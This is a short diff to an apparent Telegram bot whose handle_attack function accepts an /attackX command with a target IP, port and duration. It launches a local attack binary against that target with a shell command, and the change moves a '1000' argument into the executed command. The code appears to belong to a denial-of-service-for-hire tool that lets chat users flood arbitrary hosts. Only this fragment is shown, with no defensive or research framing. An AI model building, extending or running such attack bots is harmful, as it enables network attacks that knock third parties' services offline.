@@ -108,7 +108,7 @@ def handle_attack(message):
     # Parse command arguments
     args = message.text.split()
     if len(args) != 4:
-        bot.reply_to(message, "⚙️ **Usage:** `/attackX <IP> <PORT> <TIME> 1000")
+        bot.reply_to(message, "⚙️ **Usage:** `/attackX <IP> <PORT> <TIME>")
         return
     target, port, time_duration = args[1], args[2], args[3]
     try:
@@ -122,7 +122,7 @@ def handle_attack(message):
         return
 
     # Execute the attack
-    full_command = f"./{binary} {target} {port} {time_duration}"
+    full_command = f"./{binary} {target} {port} {time_duration} 1000"
     try:
         bot.reply_to(
             message,
